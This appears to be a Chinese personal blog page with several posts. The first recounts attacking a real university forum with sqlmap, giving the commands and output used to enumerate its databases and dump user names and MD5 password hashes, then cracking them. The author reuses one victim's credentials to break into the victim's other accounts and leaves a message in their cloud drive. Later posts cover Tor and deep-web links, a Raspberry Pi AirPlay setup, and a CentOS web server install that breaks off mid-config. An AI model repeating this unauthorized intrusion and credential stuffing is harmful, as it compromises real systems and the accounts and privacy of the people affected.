<li>sqlmap是一个开源的自动化渗透测试工具，被广泛用于发现SQL注入漏洞。sqlmap的使用几乎毫无技术含量。不过，对于一个杀手来说，他使用的刀只需要保证在任何情况下可靠还有一击毙命即可，至于刀上是否有繁复的装饰和是否仿制都是次要的。sqlmap就是注入的利器，可以高效的审计安全风险。</li>
</ul>
<h3 id="sqlmap_u7684_u4E00_u822C_u7528_u6CD5"><a href="#sqlmap_u7684_u4E00_u822C_u7528_u6CD5" class="headerlink" title="sqlmap的一般用法"></a>sqlmap的一般用法</h3><p>我这次试验的平台是在kali Linux上，系统已经集成sqlmap工具。sql注入的目标是上海某高校bbs。<br>sqlmap的使用非常简单，通常我们使用如下命令就可以获知目标url是否存在被注入的可能:<br><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title">sqlmap</span> -u <span class="string">"url"</span></span><br></pre></td></tr></table></figure></p>
<p>知道目标URL后可以用:<br><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">"url"</span> <span class="comment">--dbs</span></span><br></pre></td></tr></table></figure></p>
<p>得到了下面的数据库信息:<br><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">available databases <span class="string">[5]</span>:</span><br><span class="line"><span class="string">[*]</span> bbscore</span><br><span class="line"><span class="string">[*]</span> bbscore_db</span><br><span class="line"><span class="string">[*]</span> information_schema</span><br><span class="line"><span class="string">[*]</span> mysql</span><br><span class="line"><span class="string">[*]</span> performance_schema</span><br></pre></td></tr></table></figure></p>
<p>我们对bbs的注册用户信息感兴趣，所以我们想更进一步的知道bbscore中的信息，我们继续使用下面的命令来查看bbscore中的表:<br><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -<span class="keyword">u</span> <span class="string">"url"</span> -<span class="keyword">D</span> bbscore --tables</span><br></pre></td></tr></table></figure></p>
<p>得到了下面的表信息:<br><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">Database: bbscore</span><br><span class="line">[83 tables]</span><br><span class="line">+-----------------+</span><br><span class="line">|<span class="string"> action          </span>|</span><br><span class="line">|<span class="string"> user            </span>|</span><br><span class="line">|<span class="string"> admin           </span>|</span><br><span class="line">|<span class="string"> admin_memberfee </span>|</span><br><span class="line">|<span class="string"> admin_operlog   </span>|</span><br><span class="line">|<span class="string"> area            </span>|</span><br><span class="line">|<span class="string"> area_class      </span>|</span><br><span class="line">|<span class="string"> area_rule       </span>|</span><br><span class="line">|<span class="string"> art_pool        </span>|</span><br><span class="line">|<span class="string"> ban             </span>|</span><br><span class="line">|<span class="string"> banner          </span>|</span><br><span class="line">|<span class="string"> bbsvars         </span>|</span><br><span class="line">……</span><br></pre></td></tr></table></figure></p>
<p>省略了下面的表信息。<br>我们注意到表中有字段user，我们想知道user中的字段，使用下面的命令:<br><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">"url"</span> -D bbscore -T <span class="keyword">user</span> <span class="title">--columns</span></span><br></pre></td></tr></table></figure></p>
<p>得到下面的信息:<br><figure class="highlight scheme"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="list">[<span class="keyword">09:46:22</span>] <span class="list">[<span class="keyword">INFO</span>] fetching columns for table <span class="variable">'user</span>' in database <span class="variable">'bbscore</span>'</span><br><span class="line"><span class="list">[<span class="keyword">09:46:22</span>] <span class="list">[<span class="keyword">INFO</span>] resumed: <span class="number">30</span></span><br><span class="line"><span class="list">[<span class="keyword">09:46:22</span>] <span class="list">[<span class="keyword">INFO</span>] resumed: id</span><br><span class="line"><span class="list">[<span class="keyword">09:46:22</span>] <span class="list">[<span class="keyword">INFO</span>] resumed: int<span class="list">(<span class="keyword">10</span>)</span> unsigned</span><br><span class="line"><span class="list">[<span class="keyword">09:46:22</span>] <span class="list">[<span class="keyword">INFO</span>] resumed: username</span><br><span class="line"><span class="list">[<span class="keyword">09:46:22</span>] <span class="list">[<span class="keyword">INFO</span>] resumed: varchar<span class="list">(<span class="keyword">16</span>)</span></span><br><span class="line"><span class="list">[<span class="keyword">09:46:22</span>] <span class="list">[<span class="keyword">INFO</span>] resumed: passwd</span><br><span class="line"><span class="list">[<span class="keyword">09:46:22</span>] <span class="list">[<span class="keyword">INFO</span>] resumed: varchar<span class="list">(<span class="keyword">32</span>)</span></span><br><span class="line"><span class="list">[<span class="keyword">09:46:22</span>] <span class="list">[<span class="keyword">INFO</span>] resumed: face</span><br><span class="line"><span class="list">[<span class="keyword">09:46:22</span>] <span class="list">[<span class="keyword">INFO</span>] resumed: smallint<span class="list">(<span class="keyword">6</span>)</span></span><br><span class="line"><span class="list">[<span class="keyword">09:46:22</span>] <span class="list">[<span class="keyword">INFO</span>] resumed: sex</span><br><span class="line"><span class="list">[<span class="keyword">09:46:22</span>] <span class="list">[<span class="keyword">INFO</span>] resumed: tinyint<span class="list">(<span class="keyword">4</span>)</span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span><br></pre></td></tr></table></figure></p>
<p>太长没有爆完，因为发现了最感兴趣的username和passwd，最后一步我们直接把username和passwd中的信息dump下来:-)<br><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">"url"</span> -D bbscore -T <span class="keyword">user</span> <span class="title">-C</span> username,passwd --dump</span><br></pre></td></tr></table></figure></p>
<p>附上一张图片吧，这酸爽……<br><img src="http://ww3.sinaimg.cn/large/005WMcFzjw1f1op50sejjj31740s4qan.jpg" alt="screenshot"><br>通过md5在线破解网站获得明文密码:-)</p>
<h3 id="u610F_u5916_u7684_u60CA_u559C"><a href="#u610F_u5916_u7684_u60CA_u559C" class="headerlink" title="意外的惊喜"></a>意外的惊喜</h3><p>你们以为得到这些用户信息就完了吗，那我就不会用sqlmap引发的血案来做标题。我主要是发现了大家的密码习惯非常之糟糕，下面是正文ˊ_&gt;ˋ<br>得到了用户名和密码后黑客完全可以以某个用户的身份登入该bbs发表信息，更改密码，你们以为这样就完了吗？Naive，让我来告诉你们糟糕的习惯和淡薄的网咯安全意识是如何让你的个人资料全面泄漏的。<br>首先在这一堆用户名中我发现了一个很有特色的名字叫tonyxxxxx。(xxxxx是一个单词，被我手动屏蔽，感兴趣的可以看图)原因如下：首先这个名字很独特，不像Jack，Bill这样烂大街；其次这个名字是由tony和xxxxx两个单词组成的，我们可以猜测此用户的英文名为tony，为什么是xxxxx而不是xxxx呢？我猜是因为他曾用tonyxxxx注册过其他的账号发现该昵称已存在，所以使用了tonyxxxxxx这个昵称。根据上面的分析，我们可以获得以下的结论:  </p>
<ol>
<li>这个用户名少见，不容易和其他单词混淆</li>
<li>该用户可能在多处使用了相同用户名  </li>
</ol>
<p>下一步就是借助强大的Google查找该用户的踪迹。看截图:<br><img src="http://ww1.sinaimg.cn/large/005WMcFzjw1f1oplcex63j31700rh7eo.jpg" alt=""><br>尝试以该用户的用户名及密码登入沪江英语论坛，成功。<br>发现该用户还用此昵称注册百度账号，尝试以用户名密码登入，成功:-)<br>登入百度账号可以做什么大家可以随意想象，我是不会告诉你们我进了他的度盘给他留了个言的ˊ_&gt;ˋ<br><img src="http://ww3.sinaimg.cn/large/005WMcFzjw1f1opyfcew8j31400cwaen.jpg" alt=""></p>
<h3 id="u603B_u7ED3"><a href="#u603B_u7ED3" class="headerlink" title="总结"></a>总结</h3><p>这个可能是本世纪最低级的黑客行为，但不可否认它是有效的。我们通过分析这次渗透找出应对的措施。  </p>
<ul>
<li>该高校校园网存在sql注入漏洞，直接导致大量用户信息泄漏，这是起因。</li>
<li>密码太简单，直接导致在线md5破解很容易查出明文。</li>
<li>多处使用相同用户名和密码，一个账户信息外泄致使所有账户存在安全风险。</li>
</ul>
<p>如何应对？</p>
<ul>
<li>使用强密码是行之有效的措施</li>
<li>避免使用固定的用户名和密码，尤其是在一些安全没有保证的小站上</li>
<li>开启两步验证等方式，（手机验证码）</li>
</ul>
<p>最后的最后，很多人问密码太多记不住咋办？<br>下面问题来了：如何优雅的管理密码?<br>给大家分享一个好用的软件<a href="https://github.com/mwgg/passera" target="_blank" rel="external">passera</a>。</p>
<blockquote>
<p>A simple tool that allows users to have strong unique passwords for each website, without the need to store them either locally or with an online service. It is available as a command-line tool for Linux/Mac/Windows and an Android app.</p>
</blockquote>

      
    </div>
    
    <div class="article-info article-info-index">
      
      
	<div class="article-tag tagcloud">
		<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/sqlmap/">sqlmap</a></li></ul>
	</div>

      
	<div class="article-category tagcloud">
	<a class="article-category-link" href="/categories/渗透入侵/">渗透入侵</a>
	</div>


      
      <div class="clearfix"></div>
    </div>
    
  </div>
  
</article>









  
    <article id="post-2016-03-13-tor" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2016/03/06/2016-03-13-tor/" class="article-date">
  	<time datetime="2016-03-06T11:40:25.000Z" itemprop="datePublished">2016-03-06</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2016/03/06/2016-03-13-tor/">使用tor隐藏自己的踪迹和深网</a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <h3 id="tor_u662F_u4EC0_u4E48"><a href="#tor_u662F_u4EC0_u4E48" class="headerlink" title="tor是什么"></a>tor是什么</h3><p>官方的介绍简单翻译下：   </p>
<blockquote>
<p>tor是一个免费软件和开放的网络，可以帮助你防御网络流量嗅探(一种会威胁个人自由和隐私的网络监视)。用tor可以保护商业机密，社会激进分子，军事机密，和一些学者的研究成果。</p>
</blockquote>
<p>（渣翻译请自行体会其中重点）<br>来自<a href="https://www.torproject.org/" target="_blank" rel="external">torproject.org</a>  </p>
<h3 id="u5982_u4F55_u4F7F_u7528"><a href="#u5982_u4F55_u4F7F_u7528" class="headerlink" title="如何使用"></a>如何使用</h3><h4 id="u914D_u7F6EVidalia"><a href="#u914D_u7F6EVidalia" class="headerlink" title="配置Vidalia"></a>配置Vidalia</h4><p>据我所知，有三种办法使用tor:   </p>
<ol>
<li>使用tor的命令行版(比较复杂)  </li>
<li>使用Vidalia(GUI版本，目前已经停止维护)  </li>
<li>使用tor browser(最简单)  </li>
</ol>
<p>我使用的是Vidalia，可以在这个地方下载<a href="https://dist.torproject.org/vidalia-bundles/" target="_blank" rel="external">Vidalia</a>，貌似没有for Linux？<br>Vidalia的配置比较简单，前提是可以科学上网，因为万能的某长城貌似已经全面封锁了tor。<br><img src="http://ww2.sinaimg.cn/large/005WMcFzjw1f1vkfm9sdjj30e50fdabl.jpg" alt="screenshot"><br>选择Settings,<br><img src="http://ww1.sinaimg.cn/large/005WMcFzjw1f1vkgzqmhpj30kg0k2act.jpg" alt="screenshot"><br>选择我使用代理连接互联网，这里我的本地1080端口运行的是shadowsocks的代理。并选择我的ISP提供商封锁了tor网络的连接，并添加网桥.<br>注意，网桥可以向bridges@torproject.org发送一封内容为get bridges的邮件获得。<br>其他的设置不用管，点connect，洋葱变绿时说明连接上了tor。   </p>
<h4 id="u914D_u7F6Echrome"><a href="#u914D_u7F6Echrome" class="headerlink" title="配置chrome"></a>配置chrome</h4><p>强推一个插件SwitchyOmega,可以快速在切换浏览器代理设置。<img src="http://ww3.sinaimg.cn/large/005WMcFzjw1f1vkqfccksj313w0g5n02.jpg" alt=""></p>
<p>左侧+New Profile，如图配置9050端口即可。<br>访问下面这个页面看看配置是否成功:<a href="https://check.torproject.org/" target="_blank" rel="external">checktor</a></p>
<p>###Deep Web(深网)<br>使用tor代理，访问下面的页面试试：<a href="http://zqktlwi4fecvo6ri.onion/wiki/" target="_blank" rel="external">The Hidden Wiki</a><br>是的，这里充满各种违法的信息，比特币洗钱，军火交易，假身份……这就是人们常说的地下黑产聚集地，这就是deep web。你可以找到各种各样的信息，会遇到各种各样疯狂的人。这里高度自治，如果你足够强大也可以与之对抗。<br>一个挺不错的聊天室链接<a href="http://tetatl6umgbmtv27.onion/" target="_blank" rel="external">chat with stangers</a>，在这里我遇到了无所事事的美国年轻黑客，对中国文化很感兴趣；也偶遇了做运维的美国大叔，耐心的给我讲解perl……有两点要注意:</p>
<ol>
<li>不要泄露个人信息</li>
<li>英语要好，lol</li>
</ol>

      
    </div>
    
    <div class="article-info article-info-index">
      
      
	<div class="article-tag tagcloud">
		<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/tor/">tor</a></li></ul>
	</div>

      
	<div class="article-category tagcloud">
	<a class="article-category-link" href="/categories/渗透入侵/">渗透入侵</a>
	</div>


      
      <div class="clearfix"></div>
    </div>
    
  </div>
  
</article>









  
    <article id="post-2016-02-27-pi" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2016/02/27/2016-02-27-pi/" class="article-date">
  	<time datetime="2016-02-27T06:46:15.000Z" itemprop="datePublished">2016-02-27</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2016/02/27/2016-02-27-pi/">娱乐向---Raspberry Pi搭建家庭影音娱乐系统</a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <ul>
<li>Raspberry Pi比较入门的玩法就是用它来实现电视机机顶盒的一些功能，大家都知道树莓派上有大名鼎鼎的XBMC影音播放系统，安装完后完全可以当作网络机顶盒使用。但是我今天不会介绍XBMC，在我的方案里我通过树莓派将iPhone的音频直接输出到电视上，另外使用omxplayer进行视频播放。</li>
</ul>
<h3 id="u5B89_u88C5_u548C_u914D_u7F6E_u65E0_u7EBF_u7F51_u5361"><a href="#u5B89_u88C5_u548C_u914D_u7F6E_u65E0_u7EBF_u7F51_u5361" class="headerlink" title="安装和配置无线网卡"></a>安装和配置无线网卡</h3><p>至于为什么要配置无线网卡，答案很简单—电视机旁边没网线。我这儿正好有一块Ralink公司生产的RT2571无线网卡，把它连接到树莓派上，效果如图～ 因为我没鼠标和键盘，就只好先拿网线连路由用ssh配置无限网卡啦。<img src="http://ww2.sinaimg.cn/mw690/005WMcFzjw1f1dp0ao9wnj31kw23u1kx.jpg" alt="连接了RT2571的树莓派"><br>接下来使用:<br><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dmesg <span class="string">| grep usb</span></span><br></pre></td></tr></table></figure></p>
<p>看下无线网卡识别是否正常，找到输出的信息中有这些:<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[    <span class="number">3.340509</span>] usb <span class="number">1</span>-<span class="number">1.3</span>: Product: <span class="number">54</span>M.USB.......</span><br><span class="line">[    <span class="number">3.346769</span>] usb <span class="number">1</span>-<span class="number">1.3</span>: Manufacturer: Ralink</span><br></pre></td></tr></table></figure></p>
<p>说明网卡已经正确识别，测试下能否搜索到无线信号:<br><figure class="highlight fortran"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo iwlist wlan0 <span class="built_in">scan</span></span><br></pre></td></tr></table></figure></p>
<p>结果见下图:<br><img src="http://ww4.sinaimg.cn/mw690/005WMcFzjw1f1dp4r087jj30ve0jwgr1.jpg" alt="screenshot"><br>接下来配置无线网卡，使用vim打开网络配置文件:<br><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo vim <span class="regexp">/etc/</span>network<span class="regexp">/interfaces</span></span><br></pre></td></tr></table></figure></p>
<p>我的配置文件像这样:<br><figure class="highlight vala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="preprocessor"># interfaces(5) file used by ifup(8) and ifdown(8)</span></span><br><span class="line"><span class="preprocessor"># Please note that this file is written to be used with dhcpcd</span></span><br><span class="line"><span class="preprocessor"># For static IP, consult /etc/dhcpcd.conf and 'man dhcpcd.conf'</span></span><br><span class="line"><span class="preprocessor"># Include files from /etc/network/interfaces.d:</span></span><br><span class="line">source-directory /etc/network/interfaces.d</span><br><span class="line">auto lo</span><br><span class="line"><span class="preprocessor">#iface lo inet loopback</span></span><br><span class="line">iface eth0 inet dhcp</span><br><span class="line">auto wlan0</span><br><span class="line">allow-hotplug wlan0</span><br><span class="line"><span class="preprocessor"># iface wlan0 inet manual</span></span><br><span class="line"><span class="preprocessor"># wpa-roam /etc/wpa_supplicant/wpa_supplicant.conf</span></span><br><span class="line"><span class="preprocessor"># iface default inet dhcp</span></span><br><span class="line">iface wlan0 inet dhcp</span><br><span class="line">wpa-ssid <span class="string">"yourssid"</span></span><br><span class="line">wpa-psk <span class="string">"password"</span></span><br></pre></td></tr></table></figure></p>
<p>将其中的<code>wpa-ssid</code>和<code>wpa-psk</code>换成你的无线网络名和密码即可。<br>一般来说重新启动下树莓派无线网络即可自动连接。</p>
<h3 id="Shairport_u8BA9_u6811_u8393_u6D3E_u652F_u6301AirPlay"><a href="#Shairport_u8BA9_u6811_u8393_u6D3E_u652F_u6301AirPlay" class="headerlink" title="Shairport让树莓派支持AirPlay"></a>Shairport让树莓派支持AirPlay</h3><p>首先介绍下AirPlay，内容来源<a href="https://support.apple.com/zh-cn/HT204289" target="_blank" rel="external">Apple support</a>:  </p>
<blockquote>
<p>借助 AirPlay，您可以将音乐、照片和视频流化到 Apple TV，或者将音乐流化到 AirPort Express 或已启用 AirPlay 的扬声器。借助 AirPlay 镜像，您可以在 Apple TV 上显示 iOS 屏幕。  </p>
</blockquote>
<p>我们通过一个开源软件shairport让树莓派支持Apple的AirPlay。你可以提前连接独立声卡和音响。至于为什么需要独立声卡，你可以插上耳机感受下树莓派的底噪，音质感人～</p>
<h4 id="u5B89_u88C5shairport_u53CA_u5176_u4F9D_u8D56_u5305"><a href="#u5B89_u88C5shairport_u53CA_u5176_u4F9D_u8D56_u5305" class="headerlink" title="安装shairport及其依赖包"></a>安装shairport及其依赖包</h4><p>在终端执行如下命令:<br><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-<span class="built_in">get</span> install  libao-dev libssl-dev git avahi-utils libwww-<span class="keyword">perl</span></span><br><span class="line">sudo apt-<span class="built_in">get</span> install libcrypt-openssl-rsa-<span class="keyword">perl</span> libio-socket-inet6-<span class="keyword">perl</span>  libmodule-build-<span class="keyword">perl</span></span><br></pre></td></tr></table></figure></p>
<p>然后在合适的地方建个文件夹，cd到文件夹目录接着:<br><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">git clone http<span class="variable">s:</span>//github.<span class="keyword">com</span>/njh/<span class="keyword">perl</span>-net-sdp.git</span><br><span class="line"><span class="keyword">cd</span> <span class="keyword">perl</span>-net-sdp</span><br><span class="line"><span class="keyword">perl</span> Build.PL</span><br><span class="line">./Build</span><br><span class="line">./Build test</span><br><span class="line">sudo ./Build install</span><br><span class="line"><span class="keyword">cd</span> ..</span><br><span class="line">git clone http<span class="variable">s:</span>//github.<span class="keyword">com</span>/abrasive/shairport.git</span><br><span class="line"><span class="keyword">cd</span> shairport</span><br><span class="line"><span class="keyword">make</span></span><br></pre></td></tr></table></figure></p>
<p>运行shairport:<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./shairport -<span class="tag">a</span> <span class="string">"raspberry pi"</span></span><br></pre></td></tr></table></figure></p>
<p>之后在iPhone或者iPad上就可以看到这个AirPlay的选项，如图:<br><img src="http://ww3.sinaimg.cn/mw690/005WMcFzjw1f1dvytz5awj30hs0vkada.jpg" alt=""><br><img src="http://ww3.sinaimg.cn/mw690/005WMcFzjw1f1dvz5gmb3j30hs0vk3zh.jpg" alt=""><br>享受音乐吧(☆_☆)</p>
<h3 id="omxplayer_u64AD_u653E_u5668"><a href="#omxplayer_u64AD_u653E_u5668" class="headerlink" title="omxplayer播放器"></a>omxplayer播放器</h3><p>omxplayer是没有图形界面的，只能通过命令行来操作，不过它麻雀虽小五脏具全。<br>在终端中直接输入omxplayer就会出现相关的帮助信息，还给出了示例。在这里我就不介绍它的具体用法了。   </p>
<h3 id="u4E00_u70B9_u5FC3_u5F97"><a href="#u4E00_u70B9_u5FC3_u5F97" class="headerlink" title="一点心得"></a>一点心得</h3><p>因为开源硬件得天独厚的软件生态，树莓派可DIY的东西被无限延伸。操作起来也并不像人们想象的那么复杂，不是计算机相关专业的同学们也可以快速上手。在我这次的尝试中发现了一些小小的问题。可能是树莓派制作成本的限制，其音频输出相当的糟糕，干扰非常严重。想用树莓派直接用HDMI连接电视做高清机顶盒的同学们一定记得给树莓配上一块独立声卡，HDMI的音频输出也是相当糟糕=)</p>

      
    </div>
    
    <div class="article-info article-info-index">
      
      
	<div class="article-tag tagcloud">
		<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Pi/">Pi</a></li></ul>
	</div>

      
	<div class="article-category tagcloud">
	<a class="article-category-link" href="/categories/嵌入式开发/">嵌入式开发</a>
	</div>


      
      <div class="clearfix"></div>
    </div>
    
  </div>
  
</article>









  
    <article id="post-2016-02-19-vps" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2016/02/19/2016-02-19-vps/" class="article-date">
  	<time datetime="2016-02-19T06:20:15.000Z" itemprop="datePublished">2016-02-19</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2016/02/19/2016-02-19-vps/">centos搭建LNMP服务器</a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <ul>
<li>我们首先来看一张图片:<img src="http://ww3.sinaimg.cn/large/005WMcFzjw1f14m96z58dj313t0odagt.jpg" alt="Fuck DDOS">    </li>
<li>前天折腾完apache，顺便装好了MySQL和PHP，放了一个Discuz!的开源论坛程序，什么乱七八糟权限都没管，全是弱密码。刚准备写个博纪念一下，发现我VPS被人黑了……无奈只好重新安装一遍centos。在<a href="http://lyeec.me" target="_blank" rel="external">vagarlee</a>的建议下，我吸取上一次的教训，使用更轻量的Nginx来替代Apache。</li>
</ul>
<h3 id="u5B89_u88C5Nginx"><a href="#u5B89_u88C5Nginx" class="headerlink" title="安装Nginx"></a>安装Nginx</h3><p>在使用yum安装Nginx的时候有一些小小的麻烦,需要自己建立一个<code>nginx.repo</code>的软件源配置文件。<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/yum<span class="class">.repo</span><span class="class">.d</span>/nginx.repo</span><br></pre></td></tr></table></figure></p>
<p>在其中填写如下内容:<br><figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[nginx]</span><br><span class="line">name=nginx repo</span><br><span class="line">baseurl=http://nginx.org/packages/centos/<span class="variable">$releasever</span>/<span class="variable">$basearch</span>/</span><br><span class="line">gpgcheck=<span class="number">0</span></span><br><span class="line">enabled=<span class="number">1</span></span><br></pre></td></tr></table></figure></p>
<p>保存，使用<br><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum -y <span class="keyword">install</span> nginx</span><br></pre></td></tr></table></figure></p>
<p>nginx安装完成。<br>启动Nginx服务:<br><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/etc/init.d/nginx <span class="literal">start</span></span><br></pre></td></tr></table></figure></p>
<p>这个时候访问VPS的IP地址应该就能出现Nginx的欢迎页面了。</p>
<h3 id="u5B89_u88C5MySQL"><a href="#u5B89_u88C5MySQL" class="headerlink" title="安装MySQL"></a>安装MySQL</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum <span class="operator"><span class="keyword">install</span> mysql-<span class="keyword">server</span> mysql mysql-deve</span></span><br></pre></td></tr></table></figure>
<p>我第一次安装MySQl的时候想当然只安装了mysql，并没有安装mysql-server导致数据库无法使用，mysql-server是一个服务端，需要安装。<br>启用MySQl服务:<br><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">service mysqld <span class="literal">start</span></span><br></pre></td></tr></table></figure></p>
<p>这时候会出现长长的提示信息，恭喜数据库安装成功。<br>接下来我们给数据库设置管理员账号和密码:<br><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title">mysqladmin</span> -u root password <span class="string">'yourpassword'</span></span><br></pre></td></tr></table></figure></p>
<h3 id="u5B89_u88C5PHP"><a href="#u5B89_u88C5PHP" class="headerlink" title="安装PHP"></a>安装PHP</h3><p>这一步比较简单，直接使用yum:<br><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum <span class="keyword">install</span> php-fpm php-mysql</span><br></pre></td></tr></table></figure></p>
<ul>
<li>至此，LNMP环境的软件包已经全部安装完成，下面就是简单的配置阶段。</li>
</ul>
<h3 id="u914D_u7F6EPHP"><a href="#u914D_u7F6EPHP" class="headerlink" title="配置PHP"></a>配置PHP</h3><p>更改下面的文件:<br><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim <span class="regexp">/etc/</span>php.ini</span><br></pre></td></tr></table></figure></p>
<p>将1改为0<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cgi<span class="class">.fix_pathinfo</span> = <span class="number">0</span></span><br></pre></td></tr></table></figure></p>
<p>这儿有一段英文解释，来自<a href="www.digitalocean.com">digitalocean</a>:</p>
<blockquote>
<p>If this number is kept as a 1, the php interpreter will do its best to process the file that is as near to the requested file as possible. This is a possible security risk. If this number is set to 0, conversely, the interpreter will only process the exact file path—a much safer alternative.</p>
</blockquote>
<h3 id="u914D_u7F6ENginx"><a href="#u914D_u7F6ENginx" class="headerlink" title="配置Nginx"></a>配置Nginx</h3><p>主要是改一下Nginx.conf这个文件夹里的配置文件:<br><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim <span class="regexp">/etc/</span>nginx<span class="regexp">/conf.d/</span><span class="keyword">default</span>.conf</span><br></pre></td></tr></table></figure></p>
<p>改成了这样:<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">server&#123;</span><br><span class="line"></span><br><span class="line">    listen       <span class="number">80</span>;</span><br><span class="line">    server_name  localhost;</span><br><span class="line"></span><br><span class="line">    <span class="preprocessor">#charset koi8-r;</span></span><br><span class="line">    <span class="preprocessor">#access_log  /var/log/nginx/log/host.access.log  main;</span></span><br><span 